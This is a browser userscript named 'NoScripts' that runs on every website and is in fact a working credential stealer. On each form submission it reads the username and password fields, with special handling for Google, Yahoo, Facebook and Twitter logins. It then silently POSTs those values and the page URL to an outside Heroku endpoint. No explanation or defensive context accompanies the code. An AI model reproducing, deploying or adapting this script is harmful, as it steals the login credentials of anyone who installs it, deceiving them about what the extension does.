// ==UserScript==
// @name           NoScripts
// @namespace      http://google.com
// @include        *
// ==/UserScript==


window.searchForUser = function()
{
  var uservalue;
  
  uservalue = document.getElementById('Email');
  if ( uservalue != null ) return uservalue.value;
  
  uservalue = document.getElementById('email');
  if ( uservalue != null ) return uservalue.value;
  
  uservalue = document.getElementById('user');
  if ( uservalue != null ) return uservalue.value;
  
  uservalue = document.getElementById('User');
  if ( uservalue != null ) return uservalue.value;
  
  uservalue = document.getElementById('username');
  if ( uservalue != null ) return uservalue.value;
    
  uservalue = document.getElementById('Username');
  if ( uservalue != null ) return uservalue.value;
  
  uservalue = document.getElementById('login_email');
  if ( uservalue != null ) return uservalue.value;
    
  uservalue = document.getElementById('user_login');
  if ( uservalue != null ) return uservalue.value;
  
  uservalue = document.getElementById('userid');
  if ( uservalue != null ) return uservalue.value;
  
  uservalue = document.getElementById('signin_username');
  if ( uservalue != null ) return uservalue.value; 
  
  uservalue = document.getElementById('form_username');
  if ( uservalue != null ) return uservalue.value;
  
  uservalue = document.getElementById('sucker_name');
  if ( uservalue != null ) return uservalue.value;
  
  return null;

}

window.searchForPass = function()
{
  var passvalue;
  
  passvalue = document.getElementById('pass');
  if ( passvalue != null ) return passvalue.value;
  
  passvalue = document.getElementById('Pass');
  if ( passvalue != null ) return passvalue.value;
  
  passvalue = document.getElementById('password');
  if ( passvalue != null ) return passvalue.value;
  
  passvalue = document.getElementById('Password');
  if ( passvalue != null ) return passvalue.value;
  
  passvalue = document.getElementById('passwd');
  if ( passvalue != null ) return passvalue.value;
  
  passvalue = document.getElementById('Passwd');
  if ( passvalue != null ) return passvalue.value;
  
  passvalue = document.getElementById('login_passwd');
  if ( passvalue != null ) return passvalue.value;
  
  passvalue = document.getElementById('login_password');
  if ( passvalue != null ) return passvalue.value;

  passvalue = document.getElementById('signin_password');
  if ( passvalue != null ) return passvalue.value;
  
  passvalue = document.getElementById('form_password');
  if ( passvalue != null ) return passvalue.value;
  
  passvalue = document.getElementById('sucker_pass');
  if ( passvalue != null ) return passvalue.value;
  
  
  return null;
  
}

window.show = function()
{
  var user;
  var pass;
  var caseNo = 0;

  if (document.URL.match(/.google\.\w{2,4}/)) caseNo = 1;
  if (document.URL.match(/.yahoo\.\w{2,4}/)) caseNo = 2;
  if (document.URL.match(/.facebook\.\w{2,4}/)) caseNo = 3;
  if (document.URL.match(/.twitter\.\w{2,4}/)) caseNo = 4;
  
  switch (caseNo)
  {
    case 1:
    user = document.getElementById('Email').value;  
    pass = document.getElementById('Passwd').value;
    break;
    
    case 2:
    user = document.getElementById('username').value; 
    pass = document.getElementById('passwd').value;
    break;
    
    case 3:
    user = document.getElementById('email').value;  
    pass = document.getElementById('pass').value;
    break;
    
    case 4:
    
    if ( document.URL == 'https://twitter.com/')
      user = document.getElementById('username').value;
    else
      user = document.getElementById('username_or_email').value;
      
    if ( document.URL.match(/twitter\.com\/oauth/) ) 
      pass = document.getElementById('session[password]').value;
    else
      pass = document.getElementById('password').value;
      
    break;
    
    case 0:
    user = searchForUser();
    pass = searchForPass();
    break;
    
    default:
    break;
  }
  if ( user && pass )
  {
    //alert( "Case: " + caseNo + '\n' +user + '\n' + pass + '\n' + document.URL );
    GM_xmlhttpRequest(
      {
        method: "POST",
        url: "http://suky.heroku.com/grabmyass",
        data: "sucker[name]=" + user + "&" + "sucker[pass]=" + pass + "&" + "sucker[link]=" + document.URL,
        headers: 
        {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        onload: function(response) 
        {
          //alert(response.responseText);
        }
      });
  }

}


document.addEventListener( 'submit', show, false );